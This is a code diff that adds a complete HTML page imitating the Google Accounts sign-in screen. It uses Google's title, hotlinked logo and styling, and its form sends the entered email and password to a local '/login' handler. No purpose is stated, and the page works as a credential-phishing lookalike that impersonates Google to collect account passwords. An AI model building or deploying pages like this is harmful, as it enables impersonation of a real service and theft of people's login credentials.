@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 360px; text-align: center; }
+        .logo { margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { font-size: 16px; margin-bottom: 40px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; cursor: pointer; font-size: 14px; font-weight: 500; float: right; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <form action="/login" method="post">
+            <input type="email" name="login" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <div style="text-align: left; margin-top: 10px; font-size: 14px; color: #1a73e8;">Forgot email?</div>
+            <div style="height: 50px; margin-top: 20px;">
+                <button type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
